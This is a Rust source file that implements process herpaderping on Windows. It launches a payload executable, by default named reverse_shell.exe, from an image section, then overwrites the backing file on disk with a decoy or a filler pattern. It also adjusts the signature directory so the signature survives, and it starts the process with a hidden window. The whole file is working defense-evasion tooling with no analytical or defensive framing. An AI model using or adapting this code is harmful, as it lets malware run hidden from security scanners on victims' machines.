use ntapi::ntpsapi::{NtCurrentPeb, ProcessBasicInformation, PROCESS_CREATE_FLAGS_INHERIT_HANDLES};
use ntapi::ntrtl::{RtlCreateProcessParametersEx, RtlDestroyProcessParameters, RtlInitUnicodeString, RTL_USER_PROCESS_PARAMETERS};
use std::ffi::{c_void, CString, OsStr};
use std::io::{Error, ErrorKind, Result};
use std::iter::once;
use std::os::windows::ffi::OsStrExt;
use std::ptr::null_mut;
use std::{mem};
use winapi::shared::minwindef::{LPCVOID, LPVOID};
use winapi::shared::ntdef::{NT_SUCCESS, PUNICODE_STRING, UNICODE_STRING};
use winapi::shared::winerror::ERROR_USER_MAPPED_FILE;
use winapi::um::fileapi::{SetFilePointer, CREATE_ALWAYS, OPEN_EXISTING};
use winapi::um::memoryapi::{FlushViewOfFile, VirtualFreeEx, FILE_MAP_READ, FILE_MAP_WRITE};
use winapi::um::minwinbase::STILL_ACTIVE;
use winapi::um::processthreadsapi::GetExitCodeProcess;
use winapi::um::winbase::{FILE_BEGIN, STARTF_USESHOWWINDOW};
use winapi::um::winnt::{IMAGE_DIRECTORY_ENTRY_SECURITY, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE, LARGE_INTEGER, MEM_RELEASE};
use winapi::{
    shared::{
        basetsd::{SIZE_T, ULONG_PTR},
        minwindef::{BOOL, DWORD, ULONG},
        ntdef::{HANDLE, NTSTATUS, PVOID},
    },
    um::{
        fileapi::{CreateFileW, FlushFileBuffers, GetFileSizeEx, ReadFile, SetEndOfFile, SetFilePointerEx, WriteFile},
        handleapi::{CloseHandle, INVALID_HANDLE_VALUE},
        libloaderapi::{GetModuleHandleA, GetProcAddress},
        memoryapi::{CreateFileMappingW, MapViewOfFile, ReadProcessMemory, UnmapViewOfFile, VirtualAllocEx, WriteProcessMemory},
        processthreadsapi::GetProcessId
        ,
        winnt::{
            FILE_ATTRIBUTE_NORMAL, FILE_SHARE_DELETE, FILE_SHARE_READ, FILE_SHARE_WRITE, GENERIC_READ,
            GENERIC_WRITE, MEM_COMMIT, MEM_RESERVE, PAGE_READONLY,
            PAGE_READWRITE, PROCESS_ALL_ACCESS, SECTION_ALL_ACCESS, SEC_IMAGE, THREAD_ALL_ACCESS,
        },
    },
};
use winapi::um::winuser::SW_HIDE;
type NtCreateSection = unsafe extern "system" fn(
    SectionHandle: *mut HANDLE,
    DesiredAccess: ULONG,
    ObjectAttributes: PVOID,
    MaximumSize: *mut LARGE_INTEGER,
    SectionPageProtection: ULONG,
    AllocationAttributes: ULONG,
    FileHandle: HANDLE,
) -> NTSTATUS;

type NtCreateProcessEx = unsafe extern "system" fn(
    ProcessHandle: *mut HANDLE,
    DesiredAccess: ULONG,
    ObjectAttributes: PVOID,
    ParentProcess: HANDLE,
    Flags: ULONG,
    SectionHandle: HANDLE,
    DebugPort: HANDLE,
    ExceptionPort: HANDLE,
    InJob: BOOL,
) -> NTSTATUS;

type NtCreateThreadEx = unsafe extern "system" fn(
    ThreadHandle: *mut HANDLE,
    DesiredAccess: ULONG,
    ObjectAttributes: PVOID,
    ProcessHandle: HANDLE,
    StartRoutine: PVOID,
    Argument: PVOID,
    CreateFlags: ULONG,
    ZeroBits: ULONG_PTR,
    StackSize: SIZE_T,
    MaximumStackSize: SIZE_T,
    AttributeList: PVOID,
) -> NTSTATUS;

type NtQueryInformationProcess = unsafe extern "system" fn(
    ProcessHandle: HANDLE,
    ProcessInformationClass: ULONG,
    ProcessInformation: PVOID,
    ProcessInformationLength: ULONG,
    ReturnLength: *mut ULONG,
) -> NTSTATUS;
#[repr(C)]
#[derive(Debug, Copy, Clone)]
struct PROCESS_BASIC_INFORMATION {
    Reserved1: PVOID,
    PebBaseAddress: PVOID,
    Reserved2: [PVOID; 2],
    UniqueProcessId: ULONG_PTR,
    Reserved3: PVOID,
}

#[repr(C)]
#[derive(Debug)]
struct PEB {
    _padding: [u8; 0x10],
    ImageBaseAddress: PVOID,
}
#[repr(C)]
#[derive(Copy, Clone)]
struct UnicodeString(UNICODE_STRING);
impl UnicodeString {
    fn new() -> Self {
        Self(UNICODE_STRING {
            Length: 0,
            MaximumLength: 0,
            Buffer: null_mut(),
        })
    }

    fn as_mut_ptr(&mut self) -> *mut UNICODE_STRING {
        &mut self.0
    }
}

fn str_to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(once(0)).collect()
}

fn get_nt_function<T>(name: &str) -> Option<T> {
    unsafe {
        let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
        if ntdll.is_null() {
            return None;
        }

        let name_cstr = CString::new(name).ok()?;
        let proc_addr = GetProcAddress(ntdll, name_cstr.as_ptr());
        if proc_addr.is_null() {
            return None;
        }

        Some(mem::transmute_copy(&proc_addr))
    }
}
fn get_process_basic_info(process_handle: HANDLE) -> Result<PROCESS_BASIC_INFORMATION> {
    unsafe {
        let nt_query_info_process: NtQueryInformationProcess = get_nt_function("NtQueryInformationProcess")
            .ok_or(Error::new(ErrorKind::NotFound, "NtQueryInformationProcess not found"))?;

        let mut pbi: PROCESS_BASIC_INFORMATION = mem::zeroed();
        let status = nt_query_info_process(
            process_handle,
            0,
            &mut pbi as *mut _ as PVOID,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            null_mut(),
        );

        if !NT_SUCCESS(status) {
            return Err(Error::new(ErrorKind::NotFound, "NtQueryInformationProcess not successed"));
        }

        Ok(pbi)
    }
}

fn overwrite_file_after_with_pattern(
    file_handle: HANDLE,
    file_offset: u64,
    pattern: &[u8],
) -> Result<u32> {
    unsafe {
        let mut written_bytes: u32 = 0;

        let mut file_size_li: LARGE_INTEGER = mem::zeroed();
        if GetFileSizeEx(file_handle, &mut file_size_li) == 0 {
            return Err(Error::last_os_error());
        }
        let file_size = *file_size_li.QuadPart() as u64;

        if file_offset >= file_size {
            return Err(Error::new(ErrorKind::InvalidInput, "File offset beyond file size"));
        }

        let offset_li = mem::transmute::<i64, LARGE_INTEGER>(file_offset as i64);
        if SetFilePointerEx(file_handle, offset_li, null_mut(), FILE_BEGIN) == 0 {
            return Err(Error::last_os_error());
        }

        let mut bytes_remaining = file_size - file_offset;
        const MAX_FILE_BUFFER: usize = 64 * 1024;

        let mut buffer = if bytes_remaining > MAX_FILE_BUFFER as u64 {
            fill_buffer_with_pattern(MAX_FILE_BUFFER, pattern)
        } else {
            fill_buffer_with_pattern(bytes_remaining as usize, pattern)
        };

        while bytes_remaining > 0 {
            let bytes_to_write = if bytes_remaining < buffer.len() as u64 {
                buffer = fill_buffer_with_pattern(bytes_remaining as usize, pattern);
                bytes_remaining as u32
            } else {
                buffer.len() as u32
            };

            let mut bytes_written = 0;
            if WriteFile(
                file_handle,
                buffer.as_ptr() as LPCVOID,
                bytes_to_write,
                &mut bytes_written,
                null_mut(),
            ) == 0 {
                return Err(Error::last_os_error());
            }

            bytes_remaining -= bytes_written as u64;
            written_bytes += bytes_written;
        }

        FlushFileBuffers(file_handle);
        Ok(written_bytes)
    }
}
fn overwrite_file_contents_with_pattern(
    file_handle: HANDLE,
    pattern: &[u8],
) -> Result<()> {
    unsafe {
        let mut file_size_li: LARGE_INTEGER = mem::zeroed();
        if GetFileSizeEx(file_handle, &mut file_size_li) == 0 {
            return Err(Error::last_os_error());
        }
        let file_size = *file_size_li.QuadPart() as u64;

        let zero_offset = mem::zeroed();
        if SetFilePointerEx(file_handle, zero_offset, null_mut(), FILE_BEGIN) == 0 {
            return Err(Error::last_os_error());
        }

        let mut bytes_remaining = file_size;
        const MAX_FILE_BUFFER: usize = 64 * 1024;

        let mut buffer = if bytes_remaining > MAX_FILE_BUFFER as u64 {
            fill_buffer_with_pattern(MAX_FILE_BUFFER, pattern)
        } else {
            fill_buffer_with_pattern(bytes_remaining as usize, pattern)
        };

        while bytes_remaining > 0 {
            let bytes_to_write = if bytes_remaining < buffer.len() as u64 {
                buffer = fill_buffer_with_pattern(bytes_remaining as usize, pattern);
                bytes_remaining as u32
            } else {
                buffer.len() as u32
            };

            let mut bytes_written = 0;
            if WriteFile(
                file_handle,
                buffer.as_ptr() as LPCVOID,
                bytes_to_write,
                &mut bytes_written,
                null_mut(),
            ) == 0 {
                return Err(Error::last_os_error());
            }

            bytes_remaining -= bytes_written as u64;
        }

        FlushFileBuffers(file_handle);
        Ok(())
    }
}

fn fill_buffer_with_pattern(size: usize, pattern: &[u8]) -> Vec<u8> {
    let mut buffer = Vec::with_capacity(size);
    for i in 0..size {
        buffer.push(pattern[i % pattern.len()]);
    }
    buffer
}

fn extend_file_security_directory(
    file_handle: HANDLE,
    extended_by: u32,
) -> Result<()> {
    unsafe {
        let mut file_size_li: LARGE_INTEGER = mem::zeroed();
        if GetFileSizeEx(file_handle, &mut file_size_li) == 0 {
            return Err(Error::last_os_error());
        }
        let file_size = *file_size_li.QuadPart() as u64;

        let mapping_handle = CreateFileMappingW(
            file_handle,
            null_mut(),
            PAGE_READWRITE,
            (file_size >> 32) as DWORD,
            file_size as DWORD,
            null_mut(),
        );

        if mapping_handle.is_null() {
            return Err(Error::last_os_error());
        }

        let mapped_view = MapViewOfFile(
            mapping_handle,
            FILE_MAP_READ | FILE_MAP_WRITE,
            0,
            0,
            file_size as SIZE_T,
        );

        if mapped_view.is_null() {
            CloseHandle(mapping_handle);
            return Err(Error::last_os_error());
        }

        let dos_header = mapped_view as *const IMAGE_DOS_HEADER;
        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            UnmapViewOfFile(mapped_view);
            CloseHandle(mapping_handle);
            return Ok(());
        }

        let nt_headers_offset = (*dos_header).e_lfanew;
        let nt_headers_ptr = (mapped_view as *const u8).offset(nt_headers_offset as isize) as *const IMAGE_NT_HEADERS32;

        if (*nt_headers_ptr).Signature != IMAGE_NT_SIGNATURE {
            UnmapViewOfFile(mapped_view);
            CloseHandle(mapping_handle);
            return Ok(());
        }

        let magic = (*nt_headers_ptr).OptionalHeader.Magic;
        let security_dir = match magic {
            IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
                if (*nt_headers_ptr).OptionalHeader.NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_SECURITY as u32 {
                    // No security directory, we're done
                    UnmapViewOfFile(mapped_view);
                    CloseHandle(mapping_handle);
                    return Ok(());
                }
                &mut (*(nt_headers_ptr as *mut IMAGE_NT_HEADERS32))
                    .OptionalHeader
                    .DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY as usize]
            }
            IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
                let nt_headers64 = nt_headers_ptr as *mut IMAGE_NT_HEADERS64;
                if (*nt_headers64).OptionalHeader.NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_SECURITY as u32 {
                    // No security directory, we're done
                    UnmapViewOfFile(mapped_view);
                    CloseHandle(mapping_handle);
                    return Ok(());
                }
                &mut (*nt_headers64)
                    .OptionalHeader
                    .DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY as usize]
            }
            _ => {
                UnmapViewOfFile(mapped_view);
                CloseHandle(mapping_handle);
                return Ok(());
            }
        };

        if security_dir.VirtualAddress == 0 || security_dir.Size == 0 {
            UnmapViewOfFile(mapped_view);
            CloseHandle(mapping_handle);
            return Ok(());
        }

        security_dir.Size += extended_by;

        if FlushViewOfFile(mapped_view, file_size as SIZE_T) == 0 {
            UnmapViewOfFile(mapped_view);
            CloseHandle(mapping_handle);
            return Err(Error::last_os_error());
        }

        UnmapViewOfFile(mapped_view);
        CloseHandle(mapping_handle);
        FlushFileBuffers(file_handle);

        Ok(())
    }
}
fn copy_file_by_handle(source_handle: HANDLE, target_handle: HANDLE) -> Result<()> {
    unsafe {
        let mut file_size: i64 = 0;
        let file_size_ptr = &mut file_size as *mut i64 as *mut LARGE_INTEGER;
        if GetFileSizeEx(source_handle, file_size_ptr) == 0 {
            return Err(Error::last_os_error());
        }

        SetFilePointer(source_handle, 0, null_mut(), FILE_BEGIN);
        SetFilePointer(target_handle, 0, null_mut(), FILE_BEGIN);

        let buffer_size = 64 * 1024;
        let mut buffer = vec![0u8; buffer_size];
        let mut total_read: u64 = 0;

        while total_read < file_size as u64 {
            let mut bytes_read = 0;
            let bytes_to_read = std::cmp::min(buffer_size as u32, (file_size - total_read as i64) as u32);

            if ReadFile(
                source_handle,
                buffer.as_mut_ptr() as LPVOID,
                bytes_to_read,
                &mut bytes_read,
                null_mut(),
            ) == 0 {
                return Err(Error::last_os_error());
            }

            if bytes_read == 0 {
                break;
            }

            let mut bytes_written = 0;
            if WriteFile(
                target_handle,
                buffer.as_ptr() as LPCVOID,
                bytes_read,
                &mut bytes_written,
                null_mut(),
            ) == 0 {
                return Err(Error::last_os_error());
            }

            total_read += bytes_read as u64;
        }

        FlushFileBuffers(target_handle);
        SetEndOfFile(target_handle);

        Ok(())
    }
}

fn get_image_entry_point_rva(file_handle: HANDLE) -> Result<u32> {
    unsafe {
        let mut file_size: LARGE_INTEGER = mem::zeroed();
        if GetFileSizeEx(file_handle, &mut file_size) == 0 {
            return Err(Error::last_os_error());
        }

        let mapping_handle = CreateFileMappingW(
            file_handle,
            null_mut(),
            PAGE_READONLY,
            file_size.u().HighPart as DWORD,
            file_size.u().LowPart as DWORD,
            null_mut(),
        );

        if mapping_handle.is_null() {
            return Err(Error::last_os_error());
        }

        let mapped_view = MapViewOfFile(
            mapping_handle,
            FILE_MAP_READ,
            0,
            0,
            file_size.u().LowPart as SIZE_T,
        );

        if mapped_view.is_null() {
            CloseHandle(mapping_handle);
            return Err(Error::last_os_error());
        }

        let dos_header = mapped_view as *const IMAGE_DOS_HEADER;
        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            UnmapViewOfFile(mapped_view);
            CloseHandle(mapping_handle);
            return Err(Error::new(ErrorKind::InvalidData, "Invalid DOS signature"));
        }

        let nt_headers_offset = (*dos_header).e_lfanew;
        let nt_headers_ptr = (mapped_view as *const u8).offset(nt_headers_offset as isize) as *const IMAGE_NT_HEADERS32;

        if (*nt_headers_ptr).Signature != IMAGE_NT_SIGNATURE {
            UnmapViewOfFile(mapped_view);
            CloseHandle(mapping_handle);
            return Err(Error::new(ErrorKind::InvalidData, "Invalid NT signature"));
        }

        let magic = (*nt_headers_ptr).OptionalHeader.Magic;
        let entry_point_rva = match magic {
            IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
                (*nt_headers_ptr).OptionalHeader.AddressOfEntryPoint
            }
            IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
                let nt_headers64 = nt_headers_ptr as *const IMAGE_NT_HEADERS64;
                (*nt_headers64).OptionalHeader.AddressOfEntryPoint
            }
            _ => {
                UnmapViewOfFile(mapped_view);
                CloseHandle(mapping_handle);
                return Err(Error::new(ErrorKind::InvalidData, "Invalid optional header magic"));
            }
        };

        UnmapViewOfFile(mapped_view);
        CloseHandle(mapping_handle);

        Ok(entry_point_rva)
    }
}
fn str_to_widestring(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(once(0u16)).collect()
}
pub unsafe fn write_remote_process_parameters(
    process_handle: HANDLE,
    image_filename: &str,
    dll_path: Option<&str>,
    current_directory: Option<&str>,
    command_line: Option<&str>,
    environment_block: *mut c_void,
    windows_title: Option<&str>,
    desktop_info: Option<&str>,
    shell_info: Option<&str>,
    runtime_data: Option<&str>,
) -> Result<()> {
    let pbi = get_process_basic_info(process_handle)?;

    let image_wide = str_to_widestring(image_filename);
    let mut image_us = UnicodeString::new();
    RtlInitUnicodeString(image_us.as_mut_ptr(), image_wide.as_ptr());

    struct OptionalUnicodeStringHelper {
        _wide: Vec<u16>,
        us: UnicodeString,
    }

    impl OptionalUnicodeStringHelper {
        fn new(s: Option<&str>) -> Self {
            if let Some(s) = s {
                let wide = str_to_widestring(s);
                let mut us = UnicodeString::new();
                unsafe { RtlInitUnicodeString(us.as_mut_ptr(), wide.as_ptr()); }
                Self { _wide: wide, us }
            } else {
                Self { _wide: Vec::new(), us: UnicodeString::new() }
            }
        }

        fn as_ptr(&mut self) -> PUNICODE_STRING {
            if self._wide.is_empty() { null_mut() } else { self.us.as_mut_ptr() }
        }
    }

    let mut dll_path_helper = OptionalUnicodeStringHelper::new(dll_path);
    let mut current_dir_helper = OptionalUnicodeStringHelper::new(current_directory);
    let mut cmd_line_helper = OptionalUnicodeStringHelper::new(command_line);
    let mut title_helper = OptionalUnicodeStringHelper::new(windows_title);
    let mut desktop_helper = OptionalUnicodeStringHelper::new(desktop_info);
    let mut shell_helper = OptionalUnicodeStringHelper::new(shell_info);
    let mut runtime_helper = OptionalUnicodeStringHelper::new(runtime_data);

    let mut params: *mut RTL_USER_PROCESS_PARAMETERS = null_mut();
    let ntstatus = RtlCreateProcessParametersEx(
        &mut params,
        image_us.as_mut_ptr(),
        dll_path_helper.as_ptr(),
        current_dir_helper.as_ptr(),
        cmd_line_helper.as_ptr(),
        environment_block as PVOID,
        title_helper.as_ptr(),
        desktop_helper.as_ptr(),
        shell_helper.as_ptr(),
        runtime_helper.as_ptr(),
        0,
    );

    if !NT_SUCCESS(ntstatus) {
        return Err(Error::new(
            ErrorKind::Other,
            format!("RtlCreateProcessParametersEx failed: 0x{:08x}", ntstatus),
        ));
    }

    let len = (*params).MaximumLength as usize + (*params).EnvironmentSize as usize;
    let params_length = (*params).Length as usize;

    let remote_memory = VirtualAllocEx(
        process_handle,
        null_mut(),
        len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );

    if remote_memory.is_null() {
        RtlDestroyProcessParameters(params);
        return Err(Error::last_os_error());
    }

    let environment_backup = (*params).Environment;

    if !(*params).Environment.is_null() {
        (*params).Environment = (remote_memory as usize + params_length) as PVOID;
        (*params).WindowFlags = STARTF_USESHOWWINDOW;
        (*params).ShowWindowFlags = SW_HIDE as ULONG;
    }

    let mut written: usize = 0;
    let write_result = WriteProcessMemory(
        process_handle,
        remote_memory,
        params as LPCVOID,
        len,
        &mut written,
    );

    (*params).Environment = environment_backup;

    if write_result == 0 {
        VirtualFreeEx(process_handle, remote_memory, 0, MEM_RELEASE);
        RtlDestroyProcessParameters(params);
        return Err(Error::last_os_error());
    }

    #[cfg(target_arch = "x86_64")]
    let process_params_offset = 0x20;
    #[cfg(target_arch = "x86")]
    let process_params_offset = 0x10;

    let peb_params_addr = (pbi.PebBaseAddress as usize + process_params_offset) as LPVOID;

    if WriteProcessMemory(
        process_handle,
        peb_params_addr,
        &remote_memory as *const _ as LPCVOID,
        mem::size_of::<PVOID>(),
        null_mut(),
    ) == 0 {
        VirtualFreeEx(process_handle, remote_memory, 0, MEM_RELEASE);
        RtlDestroyProcessParameters(params);
        return Err(Error::last_os_error());
    }

    RtlDestroyProcessParameters(params);
    Ok(())
}
pub fn herpaderp_execute(
    source_path: &str,
    target_path: &str,
    replace_with_path: Option<&str>,
) -> Result<HANDLE> {
    let nt_create_section: NtCreateSection = get_nt_function("NtCreateSection")
        .ok_or(Error::new(ErrorKind::NotFound, "NtCreateSection not found"))?;

    let nt_create_process_ex: NtCreateProcessEx = get_nt_function("NtCreateProcessEx")
        .ok_or(Error::new(ErrorKind::NotFound, "NtCreateProcessEx not found"))?;

    let nt_create_thread_ex: NtCreateThreadEx = get_nt_function("NtCreateThreadEx")
        .ok_or(Error::new(ErrorKind::NotFound, "NtCreateThreadEx not found"))?;

    let nt_query_info_process: NtQueryInformationProcess = get_nt_function("NtQueryInformationProcess")
        .ok_or(Error::new(ErrorKind::NotFound, "NtQueryInformationProcess not found"))?;

    unsafe {
        let source_wide = str_to_wide(source_path);
        let source_handle = CreateFileW(
            source_wide.as_ptr(),
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        );

        if source_handle == INVALID_HANDLE_VALUE {
            return Err(Error::last_os_error());
        }

        let target_wide = str_to_wide(target_path);

        let target_handle = CreateFileW(
            target_wide.as_ptr(),
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            null_mut(),
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        );

        if target_handle == INVALID_HANDLE_VALUE {
            CloseHandle(source_handle);
            return Err(Error::last_os_error());
        }

        copy_file_by_handle(source_handle, target_handle)?;
        CloseHandle(source_handle);

        let mut section_handle: HANDLE = null_mut();
        let status = nt_create_section(
            &mut section_handle,
            SECTION_ALL_ACCESS,
            null_mut(),
            null_mut(),
            PAGE_READONLY,
            SEC_IMAGE,
            target_handle,
        );

        if status != 0 {
            CloseHandle(target_handle);
            return Err(Error::new(ErrorKind::Other, format!("NtCreateSection failed: 0x{:x}", status)));
        }

        let mut process_handle: HANDLE = null_mut();
        let status = nt_create_process_ex(
            &mut process_handle,
            PROCESS_ALL_ACCESS,
            null_mut(),
            (-1isize) as HANDLE,
            PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
            section_handle,
            null_mut(),
            null_mut(),
            0,
        );

        CloseHandle(section_handle);

        if status != 0 {
            CloseHandle(target_handle);
            return Err(Error::new(ErrorKind::Other, format!("NtCreateProcessEx failed: 0x{:x}", status)));
        }

        println!("Created process with PID: {}", GetProcessId(process_handle));

        let entry_point_rva = get_image_entry_point_rva(target_handle)?;

        if let Some(replace_path) = replace_with_path {
            let replace_wide = str_to_wide(replace_path);
            let replace_handle = CreateFileW(
                replace_wide.as_ptr(),
                GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                null_mut(),
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                null_mut(),
            );

            if replace_handle == INVALID_HANDLE_VALUE {
                CloseHandle(process_handle);
                CloseHandle(target_handle);
                let error = Error::last_os_error();
                return Err(Error::new(ErrorKind::Other, format!("Failed to open replace with file: {}", error)));
            }

            match copy_file_by_handle(replace_handle, target_handle) {
                Ok(()) => {
                    CloseHandle(replace_handle);
                }
                Err(e) => {
                    if e.raw_os_error() != Some(ERROR_USER_MAPPED_FILE as i32) {
                        CloseHandle(replace_handle);
                        CloseHandle(target_handle);
                        CloseHandle(process_handle);
                        return Err(Error::new(ErrorKind::Other, format!("Failed to replace target file: {}", e)));
                    }
                    println!("Fixing up target replacement, hiding original bytes and retaining any signature");

                    let mut replace_file_size: LARGE_INTEGER = mem::zeroed();
                    if GetFileSizeEx(replace_handle, &mut replace_file_size) == 0 {
                        CloseHandle(replace_handle);
                        CloseHandle(target_handle);
                        CloseHandle(process_handle);
                        return Err(Error::last_os_error());
                    }
                    let replace_size = *replace_file_size.QuadPart() as u64;
                    let bytes_written = overwrite_file_after_with_pattern(target_handle, replace_size, &[0x41u8, 0x48])?;

                    extend_file_security_directory(target_handle, bytes_written)?;

                    CloseHandle(replace_handle);
                }
            }
        } else {
            println!("Overwriting target with pattern");
            let pattern = [0x41u8, 0x48];
            overwrite_file_contents_with_pattern(target_handle, &pattern)?;
        }

        let mut pbi: PROCESS_BASIC_INFORMATION = mem::zeroed();
        let status = nt_query_info_process(
            process_handle,
            ProcessBasicInformation,
            &mut pbi as *mut _ as PVOID,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            null_mut(),
        );

        if status != 0 {
            CloseHandle(process_handle);
            CloseHandle(target_handle);
            return Err(Error::new(ErrorKind::Other, "Failed to query process info"));
        }

        let mut peb: PEB = mem::zeroed();
        if ReadProcessMemory(
            process_handle,
            pbi.PebBaseAddress,
            &mut peb as *mut _ as LPVOID,
            size_of::<PEB>(),
            null_mut(),
        ) == 0 {
            CloseHandle(process_handle);
            CloseHandle(target_handle);
            return Err(Error::last_os_error());
        }

        let command_line = format!("\"{}\"", target_path);
        let desktop_info = "WinSta0\\Default";
        write_remote_process_parameters(
            process_handle,
            target_path,
            None,
            None,
            Some(&command_line[..]),
            (*(*NtCurrentPeb()).ProcessParameters).Environment as *mut c_void,
            Some(target_path),
            Some(desktop_info),
            None,
            None,
        )?;

        let remote_entry_point = (peb.ImageBaseAddress as usize + entry_point_rva as usize) as PVOID;

        let mut thread_handle: HANDLE = null_mut();
        let status = nt_create_thread_ex(
            &mut thread_handle,
            THREAD_ALL_ACCESS,
            null_mut(),
            process_handle,
            remote_entry_point,
            null_mut(),
            0,
            0, 0, 0, null_mut(),
        );

        if !NT_SUCCESS(status) {
            eprintln!("NtCreateThreadEx(entry) failed: 0x{:08x}", status);
            CloseHandle(process_handle);
            CloseHandle(target_handle);
            return Err(Error::new(ErrorKind::Other, format!("NtCreateThreadEx failed: 0x{:x}", status)));
        } else {
            println!("Created thread at EntryPoint 0x{:x}", remote_entry_point as usize);
        }
        CloseHandle(thread_handle);
        CloseHandle(target_handle);
        let mut exit_code: DWORD = STILL_ACTIVE;
        if GetExitCodeProcess(process_handle, &mut exit_code) == 0 {
            eprintln!("GetExitCodeProcess failed: {}", Error::last_os_error());
        } else if exit_code == STILL_ACTIVE {
            println!("Process is running successfully!");
        } else {
            println!("Process exited with code: 0x{:x}", exit_code);
        }

        Ok(process_handle)
    }
}

pub fn create_process(payload_path: &Option<String>, decoy_path: &Option<String>, replace_path: &Option<String>) -> Result<()> {
    let (source_path, target_path) = match (payload_path, decoy_path) {
        (None, None) => {
            let source = concat!(env!("OUT_DIR"), "/reverse_shell.exe");
            let target = concat!(env!("OUT_DIR"), "/decoy.exe");
            (source.to_string(), target.to_string())
        }
        (Some(payload), Some(decoy)) => {
            if !std::path::Path::new(payload).exists() {
                return Err(Error::new(
                    ErrorKind::NotFound,
                    format!("Payload file not found: {}", payload)
                ));
            }
            if !std::path::Path::new(decoy).exists() {
                return Err(Error::new(
                    ErrorKind::NotFound,
                    format!("Decoy file not found: {}", decoy)
                ));
            }
            (payload.clone(), decoy.clone())
        }
        _ => {
            return Err(Error::new(
                ErrorKind::Other,
                "Payload path and decoy path are required both or none"
            ));
        }
    };
    
    let process_handle = herpaderp_execute(source_path.as_str(), target_path.as_str(), replace_path.as_deref())?;

    println!("Process created successfully! Handle: {:?}", process_handle);
    Ok(())
}